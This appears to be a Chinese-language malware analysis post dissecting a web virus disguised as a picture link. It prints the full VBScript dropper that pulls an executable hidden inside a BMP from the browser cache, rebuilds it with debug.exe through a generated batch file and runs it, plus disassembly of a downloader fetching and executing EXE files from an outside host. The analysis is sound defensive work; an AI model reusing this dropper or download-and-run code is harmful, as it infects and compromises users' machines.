

# 某网页病毒浅析

> 原文：[`www.pediy.com/kssd/pediy06/pediy6509.htm`](https://www.pediy.com/kssd/pediy06/pediy6509.htm)

某日，一 QQ 好友给我发信息，说正在看一幅画，还强调没病毒，我想把链接框起来，用网络快车下载下来看，没想到一下子点进去了，防火墙蹦出来，问要不要让 mshta.exe 访问网络，我知道中毒了，直接禁止他，然后用网络快车下载该 jpg 文件看，原来是 html+javascript,找到如下可疑内容：  
  
<img src="/images/girl.jpg" width="600" height="800">  
显示 jpg 图像，让人以为此奶一 MM 图片  
  
<IMG SRC=klook.bmp width=0 height=0>  
<object data="klook.ASP" width=0 height=0>  
klook.bmp 和 klook.ASP 保证有问题  
  
于是下载 klook.bmp 看，确实是 bmp 图，但都是乱七八糟的色块，于是用 UltraEdit 打开看，文件头是 BMP 没错，壳居然发现"MZ"和"PE"字样！我明白了，他把 EXE 文件粘贴再 BMP 文件头的后面！  
  
再下载 klook.asp，内容如下：  
<title>-</title>  
  
<SCRIPT LANGUAGE="VBScript">  
Option Explicit  
Dim FSO,WSH,CACHE,str,sucess  
Set FSO = CreateObject("Scripting.FileSystemObject")  
Set WSH = CreateObject("WScript.Shell")  
CACHE=wsh.RegRead("HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders\\Cache")  
sucess=0  
  
  
 SearchBMPFile fso.GetFolder(CACHE),"klook\[1\].bmp"  
 if sucess=0 then SearchBMPFile fso.GetFolder(CACHE),"klook\[2\].bmp"  
  
  
Function SearchBMPFile(Folder,fname)  
   Dim SubFolder,File,Lt,tmp,winsys  
   str=FSO.GetParentFolderName(folder) & "\\" & folder.name & "\\" & fname');  
   if FSO.FileExists(str) then  
      tmp=fso.GetSpecialFolder(2) & "\\"  
      winsys=fso.GetSpecialFolder(1) & "\\"  
      set File=FSO.GetFile(str)  
      File.Copy(tmp & "tmp.dat")  
      On Error Resume Next  
      File.Delete  
      if FSO.FileExists(str) then exit function  
      set Lt=FSO.CreateTextFile(tmp & "tmp.in")  
      Lt.WriteLine("rbx")  
      Lt.WriteLine("0")  
      Lt.WriteLine("rcx")  
      Lt.WriteLine("2200")  
      Lt.WriteLine("w136")  
      Lt.WriteLine("q")  
      Lt.Close  
      set Lt=FSO.CreateTextFile(tmp & "tmp.bat")  
      Lt.WriteLine("%40echo off")  
      Lt.WriteLine(chr(100) & "ebug " & tmp & "tmp.dat <" & tmp & "tmp.in >" & tmp & "tmp.out")  
      Lt.WriteLine("copy " & tmp & "tmp.dat " & winsys & "klook.exe>" & tmp & "tmp.out")  
      Lt.WriteLine("del " & tmp & "tmp.dat >" & tmp & "tmp.out")  
      Lt.WriteLine("del " & tmp & "tmp.in >" & tmp & "tmp.out")  
      Lt.WriteLine(winsys & "klook.exe")  
      Lt.WriteLine("del %0")  
      Lt.Close  
      sucess=1  
      WSH.Run tmp & "tmp.bat",false,6  
      On Error Resume Next  
  
   end if  
   If Folder.SubFolders.Count <> 0 Then  
      For Each SubFolder In Folder.SubFolders  
         SearchBMPFile SubFolder,fname  
      Next  
   End If  
End Function  
window.close  
</script>  
  
<SCRIPT language=JavaScript>  
parent.moveTo(0,0);  
parent.resizeTo(0,0);  
</SCRIPT>  
  
大概是这样的：  
先创建 Scripting.FileSystemObject 对象和 WScript.Shell 对象，读取 IE 临时文件所在地，然后搜索下载的 klook.bmp 文件，再把 klook.bmp 尾部附加的 exe 文件放出来执行。  
  
下次把那个 exe 文件切下来反汇编一下

:00403648 55                      push ebp  
:00403649 8BEC                    mov ebp, esp  
:0040364B 83C4F0                  add esp, FFFFFFF0  
:0040364E 53                      push ebx  
:0040364F 56                      push esi  
:00403650 57                      push edi  
:00403651 B8F0354000              mov eax, 004035F0  
:00403656 E8B9FCFFFF              call 00403314  
:0040365B 33C0                    xor eax, eax  
:0040365D 55                      push ebp  
:0040365E 68B1364000              push 004036B1  
:00403663 64FF30                  push dword ptr fs:\[eax\]  
:00403666 648920                  mov dword ptr fs:\[eax\], esp  
  
\* Possible StringData Ref from Code Obj ->"C:\\windows\\winsoft1.exe"  
                                  |  
:00403669 BACC364000              mov edx, 004036CC  
  
\* Possible StringData Ref from Code Obj ->"http://www.918dj.com/IESP1.exe"  
                                  |  
:0040366E B8EC364000              mov eax, 004036EC  
:00403673 E8B0FEFFFF              call 00403528  
:00403678 84C0                    test al, al  
:0040367A 740C                    je 00403688  
:0040367C 6A00                    push 00000000  
  
\* Possible StringData Ref from Code Obj ->"C:\\windows\\winsoft1.exe"  
                                  |  
:0040367E 680C374000              push 0040370C  
  
\* Reference To: KERNEL32.WinExec, Ord:0000h  
                                  |  
:00403683 E840FDFFFF              Call 004033C8  
  
\* Referenced by a (U)nconditional or (C)onditional Jump at Address:  
|:0040367A(C)  
|  
  
\* Possible StringData Ref from Code Obj ->"C:\\windows\\winsoft2.exe"  
                                  |  
:00403688 BA2C374000              mov edx, 0040372C  
  
\* Possible StringData Ref from Code Obj ->"http://www.918dj.com/IESP2.exe"  
                                  |  
:0040368D B84C374000              mov eax, 0040374C  
:00403692 E891FEFFFF              call 00403528  
:00403697 84C0                    test al, al  
:00403699 740C                    je 004036A7  
:0040369B 6A00                    push 00000000  
  
\* Possible StringData Ref from Code Obj ->"C:\\windows\\winsoft2.exe"  
                                  |  
:0040369D 686C374000              push 0040376C  
  
\* Reference To: KERNEL32.WinExec, Ord:0000h  
                                  |  
:004036A2 E821FDFFFF              Call 004033C8  
  
很简单，该病毒下载 http://www.918dj.com/IESP1.exe 或者 http://www.918dj.com/IESP2.exe 并执行  
  

 4dd466d0e1e0cc123afbe504da2462ca